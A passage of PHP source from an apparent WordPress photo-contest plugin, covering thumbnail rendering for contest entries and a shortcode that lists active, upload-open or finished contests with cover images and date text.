            $template_data["upload_info"] = $photo->upload_info;

            if ( fv_photo_in_new_page($theme) ) {
                $template_data["image_full"] = $default_template_data["page_url"]  . '=' . $photo->id;
            } else {
                $template_data["image_full"] = FvFunctions::getPhotoFull($photo);
            }
            $template_data["thumbnail"] = FvFunctions::getPhotoThumbnailArr($photo, $thumb_size);

            //wp_get_attachment_image_src($photo->image_id, $thumb_size['name']);
            if ( empty($template_data["thumbnail"][1]) || $template_data["thumbnail"][1] == 0 ) {
                $template_data["thumbnail"][1] = '';
            }
            if ( empty($template_data["thumbnail"][2]) || $template_data["thumbnail"][2] == 0 ) {
                $template_data["thumbnail"][2] = '';
            }
            // If pic width more than block width
            if ( $template_data["thumbnail"][1] > $fv_block_width && $theme != 'flickr' ) {

                if ( $template_data["thumbnail"][2] > 0 ) {
                    // Scale height
                    $template_data["thumbnail"][2] = round( $template_data["thumbnail"][2] / ($template_data["thumbnail"][1] / $fv_block_width) );
                }
                $template_data["thumbnail"][1] = $fv_block_width;

            }
            $template_data["data_title"] = FvFunctions::getLightboxTitle($photo, $default_template_data['public_translated_messages']['vote_count_text']);

            $template_data["leaders"] = false;
            $template_data["fv_block_width"] = $fv_block_width;

            FvFunctions::render_template(
                FvFunctions::get_theme_path($theme, 'list_item.php'), array_merge($default_template_data, $template_data)
            );
            //include plugin_dir_path(__FILE__) . '/themes/' . $theme . '/unit.php';
        }
        echo '</div>';
        do_action('fv_after_shows_loop', $theme);
    }

// @END FUNCTION fv_show_vote

    /**
     * Shortcode :: Show all contest items
     * [fv_contests_list type="active,upload_opened,finished" count=""]
     * @since    2.2.082
     *
     * @param array $args {'theme', 'type', 'count', 'on_row'}
     *
     * @return void
     * @output html code
     */
    public function shortcode_show_contests_list($args)
    {
        //* Define the array of defaults
        $defaults = array(
            'theme' => 'default',
            'type' => 'active',     // active, upload_opened, finished
            'count' => '6',
            'on_row' => '4',
            'order' => '',
            'sort' => '',
        );
        //* merge incoming $args with $defaults
        $args = wp_parse_args($args, $defaults);

        wp_enqueue_style('fv_main_css', fv_min_url(FV::$ASSETS_URL . 'css/fv_main.css'), false, FV::VERSION, 'all');
        //wp_enqueue_style('fv_font_css', plugins_url('wp-foto-vote/assets/icommon/fv_fonts.css'), false, FV::VERSION, 'all');
        wp_enqueue_style('fv_list_css_tpl',  FV::$THEMES_ROOT_URL . 'contests_list/'.$args['theme'].'/assets/contests_list.css', false, FV::VERSION, 'all');

        // pass args variables to template
        $template_data = $args;

        $query = ModelContest::query()
                    ->limit( (int) $args['count'] )
                    ->group_by( '`t`.`id`' )
                    ->leftJoin( ModelCompetitors::tableName(), "P", "`P`.`contest_id` = `t`.`id`", array('count'=>"COUNT(`P`.`id`)", 'votes_count'=>"SUM(`P`.`votes_count`)") );

        switch ( $args['type'] ) {
            case 'active':
                $query->where_early( 'date_start', current_time('timestamp', 0) );
                $query->where_later( 'date_finish', current_time('timestamp', 0) );
                break;
            case 'upload_opened':
                $query->where_later( 'upload_date_finish', current_time('timestamp', 0) );
                break;
            case 'finished':
                $query->where_early( 'date_finish', current_time('timestamp', 0) );
                break;
            default:
                break;
        }

        $sort = 'name';
        if ( $args['sort'] && in_array($args['sort'], array('date_start', 'date_finish', 'name')) ) {
            $sort = sanitize_title($args['sort']);
        }

        if ( isset($args['order']) && $args['order'] == 'ASC' ) {
            $query->sort_by( $sort,  FvQuery::ORDER_ASCENDING );
        } elseif( isset($args['order']) ) {
            $query->sort_by( $sort, FvQuery::ORDER_DESCENDING );
        }

        // Set up blocks width
        if ( !isset($args['width']) ) {
            $template_data['width'] = FvFunctions::ss('list-block-width', FV_CONTEST_BLOCK_WIDTH);
        }

        $contests = $query->find(false);

        if ( !is_array($contests) || count($contests) == 0 ) {
            return;
        }

        //FvFunctions::dump( $contests );


        foreach($contests as $CONTEST) {
            $public_messages = fv_get_public_translation_messages();

            $CONTEST->cover_image_url = '';

            $thumb_params = array(
                'width' => FvFunctions::ss('list-thumb-width', 200),
                'height' => FvFunctions::ss('list-thumb-height', 200),
                'crop' => FvFunctions::ss('list-thumb-crop', true),
                'size_name' => 'fv-thumb-list',
            );

            if ( empty($CONTEST->cover_image) ) {
                $first_photo = ModelCompetitors::query()
                    ->where_all( array('contest_id' => $CONTEST->id, 'status' => ST_PUBLISHED) )
                    ->limit(1)
                    ->sort_by('id', 'ASC')
                    ->findRow();
                if ( !empty($first_photo) ) {
                    $CONTEST->cover_image_url = FvFunctions::getContestThumbnailArr( $first_photo->image_id, $thumb_params, $first_photo->url );
                } else {
                    $CONTEST->cover_image_url = array( FV::$ASSETS_URL . 'img/no-photo.png', 440, 250, false );
                }

            } else {
                $CONTEST->cover_image_url = FvFunctions::getContestThumbnailArr( $CONTEST->cover_image, $thumb_params );
            }

            switch ( $args['type'] ) {
                case 'active':
                    $CONTEST->cover_text = sprintf( $public_messages['contest_list_active'],
                                                    date('d-m-Y', strtotime($CONTEST->date_finish) )
                                            );
                    break;
                case 'upload_opened':
                    //echo 'upload_opened';
                    // if upload not started at now
                    if ( strtotime($CONTEST->upload_date_start) > current_time('timestamp', 0) ) {
                        $CONTEST->cover_text = sprintf( $public_messages['contest_list_upload_opened_future'],
                            date('d-m-Y', strtotime($CONTEST->upload_date_start)),
                            date('d-m-Y', strtotime($CONTEST->upload_date_finish))
                        );
                        $CONTEST->upload_started = false;
                    } else {
                        $CONTEST->cover_text = sprintf( $public_messages['contest_list_upload_opened_now'],
                            date('d-m-Y', strtotime($CONTEST->upload_date_start)),
                            date('d-m-Y', strtotime($CONTEST->upload_date_finish))
                        );
                        $CONTEST->upload_started = true;
                    }
                    break;
                case 'finished':
                    $CONTEST->cover_text = sprintf( $public_messages['contest_list_finished'],
                                                    date('d-m-y', strtotime($CONTEST->date_finish) )
                                            );
                    break;
                default:
                    if ( current_time('timestamp', 0) < strtotime($CONTEST->date_finish) ) {
                        $CONTEST->cover_text = sprintf( $public_messages['contest_list_active'],
                                                        date('d-m-Y', strtotime($CONTEST->upload_date_finish) )
                                                );
                    } elseif ( current_time('timestamp', 0) < strtotime($CONTEST->date_finish) ) {
                        $CONTEST->cover_text = sprintf( $public_messages['contest_list_upload_opened_now'],
                                                        date('d-m-Y', strtotime($CONTEST->upload_date_start)),
                                                        date('d-m-Y', strtotime($CONTEST->upload_date_finish))
                                                );
                    } elseif ( current_time('timestamp', 0) > strtotime($CONTEST->date_finish) ) {
                        $CONTEST->cover_text = sprintf( $public_messages['contest_list_finished'],
                                                        date('d-m-Y', strtotime($CONTEST->date_finish) )
                                                );
                    }
                    break;
            }

            $template_data['contests'][] = $CONTEST;
        }

        return FvFunctions::render_template( FvFunctions::get_theme_path("", 'contests_list/'.$args['theme'].'/list.php'), $template_data, true, "contests_list" );


    }
}